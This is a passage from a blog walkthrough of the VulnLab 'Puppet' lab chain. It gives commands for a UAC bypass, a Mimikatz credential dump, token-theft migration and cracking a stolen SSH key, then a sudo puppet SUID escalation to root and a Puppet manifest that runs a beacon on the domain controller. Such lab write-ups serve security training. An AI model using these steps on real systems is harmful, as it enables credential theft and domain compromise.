+<h3 id="Setting-up-the-UAC-Bypass-Extension"><a href="#Setting-up-the-UAC-Bypass-Extension" class="headerlink" title="Setting up the UAC Bypass Extension"></a>Setting up the UAC Bypass Extension</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Copy folder for desired UAC bypass to the sliver extensions folder</span><br><span class="line">cp -rp ~/dev/UACBypasses/SspiUacBypass /root/.sliver-client/extensions/</span><br><span class="line"># CD into the new extension folder and run make</span><br><span class="line">cd /root/.sliver-client/extensions/SspiUacBypass/; make</span><br><span class="line"># From sliver client cli, load extension by providing new path</span><br><span class="line">extensions load /root/.sliver-client/extensions/SspiUacBypass</span><br></pre></td></tr></table></figure>
+
+<p>Execute the UAC bypass:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SspiUacBypass c:\\programdata\\puppet\\puppet-update.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Puppet/nt_authority.png" alt="NT Authority System"></p>
+<p><img src="/images/Puppet/full_admin.png" alt="Full Admin Access"></p>
+<p>Excellent! We now have full administrative access with an elevated token.</p>
+<hr>
+<h2 id="Credential-Dumping-with-Mimikatz"><a href="#Credential-Dumping-with-Mimikatz" class="headerlink" title="Credential Dumping with Mimikatz"></a>Credential Dumping with Mimikatz</h2><p>Now that we have full access, let’s use Mimikatz to dump credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">armory install mimikatz</span><br><span class="line">mimikatz privilege::debug sekurlsa::logonpasswords exit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Puppet/svc_puppet_win.png" alt="SVC Puppet Win Credentials"></p>
+<p>Besides the hashes for Bruce Smith and the machine account, we also recovered credentials for a new user: <code>svc_puppet_win_t1</code>. This account is likely used by Puppet to execute commands on Tier 1 Windows servers. According to the Active Directory data we gathered earlier, there’s also a <code>svc_puppet_win_t0</code> account, which likely manages Tier 0 assets.</p>
+<p><img src="/images/Puppet/t1_admins.png" alt="T1 Admins Group"></p>
+<hr>
+<h2 id="Lateral-Movement-via-Token-Impersonation"><a href="#Lateral-Movement-via-Token-Impersonation" class="headerlink" title="Lateral Movement via Token Impersonation"></a>Lateral Movement via Token Impersonation</h2><p>We can obtain a session as <code>svc_puppet_win_t1</code> by migrating into a process running under its context, effectively stealing its token.</p>
+<p>First, let’s enumerate services:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sa-sc-enum</span><br></pre></td></tr></table></figure>
+
+<p>Query the Puppet service on FILE01:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sa-sc-query FILE01 puppet</span><br><span class="line">[*] Successfully executed sa-sc-query (coff-loader)</span><br><span class="line">[*] Got output:</span><br><span class="line">SERVICE_NAME: puppet</span><br><span class="line">	TYPE                 : 16 WIN32_OWN</span><br><span class="line">	STATE                : 4 RUNNING</span><br><span class="line">	WIN32_EXIT_CODE      : 0</span><br><span class="line">	SERVICE_EXIT_CODE    : 0</span><br><span class="line">	CHECKPOINT           : 0</span><br><span class="line">	WAIT_HINT            : 0</span><br><span class="line">	PID                  : 2428</span><br><span class="line">	Flags                : 0</span><br></pre></td></tr></table></figure>
+
+<p>Migrate to the Puppet service process:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate -p 2428</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Puppet/beacon_as_svc.png" alt="Beacon as SVC Account"></p>
+<p>Perfect! We now have a beacon running as the <code>svc_puppet_win_t1</code> service account.</p>
+<hr>
+<h2 id="Domain-Controller-Enumeration"><a href="#Domain-Controller-Enumeration" class="headerlink" title="Domain Controller Enumeration"></a>Domain Controller Enumeration</h2><p>Now that we have access to the Domain Controller (DC), let’s enumerate the shares accessible to this account:</p>
+<p><img src="/images/Puppet/enumaration_share.png" alt="Enumeration of Shares"></p>
+<p>We discover an interesting IT share containing a <code>.ssh</code> directory. Inside, we find SSH keys:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">download \\\\dc01.puppet.vl\\it\\.ssh\\ed25519</span><br><span class="line">download \\\\dc01.puppet.vl\\it\\.ssh\\ed25519.pub</span><br></pre></td></tr></table></figure>
+
+<p>Examining the public key reveals it belongs to a user named <code>svc_puppet_lin_t1</code>:</p>
+<p><img src="/images/Puppet/ssh_key.png" alt="SSH Key Discovery"></p>
+<hr>
+<h2 id="Cracking-the-SSH-Private-Key"><a href="#Cracking-the-SSH-Private-Key" class="headerlink" title="Cracking the SSH Private Key"></a>Cracking the SSH Private Key</h2><p>The private key is password-protected. Let’s crack it using <code>ssh2john</code> and John the Ripper:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh2john ed25519 &gt; hash</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john hash --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>Success! The passphrase cracks successfully.</p>
+<h3 id="Establishing-SSH-Access"><a href="#Establishing-SSH-Access" class="headerlink" title="Establishing SSH Access"></a>Establishing SSH Access</h3><p>We have three options for pivoting to the Linux Puppet server:</p>
+<ol>
+<li>Using Ligolo</li>
+<li>Using Chisel</li>
+<li>Using Sliver’s built-in port forwarding</li>
+</ol>
+<p>We’ll use Sliver’s port forwarding as it’s the simplest approach and we only need one port:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add --bind 2233 -r 10.10.14.164:22</span><br></pre></td></tr></table></figure>
+
+<p>Convert the key format from CRLF to LF for Linux compatibility:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dos2unix ed25519</span><br></pre></td></tr></table></figure>
+
+<p>Now SSH to the Puppet Linux server (note: this may hang, be patient):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i lin_key -t &#x27;svc_puppet_lin_t1@puppet.vl&#x27;@127.0.0.1 -p 2222</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Linux-Privilege-Escalation"><a href="#Linux-Privilege-Escalation" class="headerlink" title="Linux Privilege Escalation"></a>Linux Privilege Escalation</h2><p>Once connected, check sudo privileges:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>We discover we can run Puppet with sudo privileges:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ALL) NOPASSWD: /usr/bin/puppet</span><br></pre></td></tr></table></figure>
+
+<h3 id="Gaining-Root-Access"><a href="#Gaining-Root-Access" class="headerlink" title="Gaining Root Access"></a>Gaining Root Access</h3><p>Exploit the sudo privileges to get root:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo puppet apply -e &quot;exec &#123; &#x27;/bin/sh -c \&quot;chmod u+s /bin/bash\&quot;&#x27;: &#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>This sets the SUID bit on <code>/bin/bash</code>, allowing us to escalate to root. Let’s add our SSH key to root’s authorized_keys for persistent access and continue enumeration.</p>
+<hr>
+<h2 id="Puppet-Infrastructure-Enumeration"><a href="#Puppet-Infrastructure-Enumeration" class="headerlink" title="Puppet Infrastructure Enumeration"></a>Puppet Infrastructure Enumeration</h2><p>Let’s identify which machines are managed by this Puppet master instance:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puppet cert list --all</span><br></pre></td></tr></table></figure>
+
+<p>We can see that both <code>file01</code> and the Domain Controller (<code>dc01</code>) are controlled by this Puppet master instance. While we know <code>svc_puppet_win_t1</code> manages file01, we can infer that <code>svc_puppet_win_t0</code> likely manages the Domain Controller.</p>
+<hr>
+<h2 id="Domain-Controller-Compromise-via-Puppet"><a href="#Domain-Controller-Compromise-via-Puppet" class="headerlink" title="Domain Controller Compromise via Puppet"></a>Domain Controller Compromise via Puppet</h2><p>Let’s leverage Puppet to execute commands on the Domain Controller:</p>
+<p>Create the manifests directory:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /etc/puppet/code/environments/production/manifests</span><br><span class="line">nano /etc/puppet/code/environments/production/manifests/site.pp</span><br></pre></td></tr></table></figure>
+
+<p>Add the following Puppet configuration:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">node &#x27;dc01.puppet.vl&#x27; &#123;</span><br><span class="line">  exec &#123; &#x27;pwned&#x27;:</span><br><span class="line">    command   =&gt; &#x27;C:\\Windows\\System32\\cmd.exe /c \\\\file01.puppet.vl\\files\\update.exe&#x27;,</span><br><span class="line">    logoutput =&gt; true,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">node default &#123;</span><br><span class="line">  notify &#123; &#x27;This is the default node&#x27;: &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Apply the Puppet manifest:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puppet apply /etc/puppet/code/environments/production/manifests/site.pp</span><br></pre></td></tr></table></figure>
+
+<p>Shortly after execution, we receive a beacon</p>
+<hr>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Puppet-ProLab-Chain-from-Hack-The-Box-VulnLab-Pentesting-Walkthrough-Writeup"><span class="toc-number">1.</span> <span class="toc-text">Puppet ProLab&#x2F;Chain from Hack The Box - VulnLab Pentesting Walkthrough &amp; Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Port-Scanning"><span class="toc-number">1.2.1.</span> <span class="toc-text">Port Scanning</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Accessing-the-Sliver-C2-Framework"><span class="toc-number">1.3.</span> <span class="toc-text">Accessing the Sliver C2 Framework</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP-Enumeration"><span class="toc-number">1.3.1.</span> <span class="toc-text">FTP Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Configuring-the-Sliver-Client"><span class="toc-number">1.3.2.</span> <span class="toc-text">Configuring the Sliver Client</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Beacon-Access"><span class="toc-number">1.4.</span> <span class="toc-text">Initial Beacon Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Spawning-an-Interactive-Session"><span class="toc-number">1.4.1.</span> <span class="toc-text">Spawning an Interactive Session</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory-Enumeration"><span class="toc-number">1.5.</span> <span class="toc-text">Active Directory Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Share-Enumeration"><span class="toc-number">1.6.</span> <span class="toc-text">SMB Share Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-Discovery"><span class="toc-number">1.7.</span> <span class="toc-text">Privilege Escalation Discovery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PrintNightmare-Vulnerability"><span class="toc-number">1.7.1.</span> <span class="toc-text">PrintNightmare Vulnerability</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting-PrintNightmare"><span class="toc-number">1.7.2.</span> <span class="toc-text">Exploiting PrintNightmare</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UAC-Bypass"><span class="toc-number">1.8.</span> <span class="toc-text">UAC Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Setting-up-the-UAC-Bypass-Extension"><span class="toc-number">1.8.1.</span> <span class="toc-text">Setting up the UAC Bypass Extension</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Credential-Dumping-with-Mimikatz"><span class="toc-number">1.9.</span> <span class="toc-text">Credential Dumping with Mimikatz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lateral-Movement-via-Token-Impersonation"><span class="toc-number">1.10.</span> <span class="toc-text">Lateral Movement via Token Impersonation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Controller-Enumeration"><span class="toc-number">1.11.</span> <span class="toc-text">Domain Controller Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cracking-the-SSH-Private-Key"><span class="toc-number">1.12.</span> <span class="toc-text">Cracking the SSH Private Key</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Establishing-SSH-Access"><span class="toc-number">1.12.1.</span> <span class="toc-text">Establishing SSH Access</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-Privilege-Escalation"><span class="toc-number">1.13.</span> <span class="toc-text">Linux Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Gaining-Root-Access"><span class="toc-number">1.13.1.</span> <span class="toc-text">Gaining Root Access</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Puppet-Infrastructure-Enumeration"><span class="toc-number">1.14.</span> <span class="toc-text">Puppet Infrastructure Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Controller-Compromise-via-Puppet"><span class="toc-number">1.15.</span> <span class="toc-text">Domain Controller Compromise via Puppet</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/11/04/VL-Puppet/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/11/04/VL-Puppet/&text=VL-Puppet"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/11/04/VL-Puppet/&title=VL-Puppet"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/11/04/VL-Puppet/&is_video=false&description=VL-Puppet"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Puppet&body=Check out this article: https://panosoikogr.github.io/2025/11/04/VL-Puppet/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/11/04/VL-Puppet/&title=VL-Puppet"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/11/04/VL-Puppet/&title=VL-Puppet"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/11/04/VL-Puppet/&title=VL-Puppet"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/11/04/VL-Puppet/&title=VL-Puppet"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/11/04/VL-Puppet/&name=VL-Puppet&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/11/04/VL-Puppet/&t=VL-Puppet"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2027
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
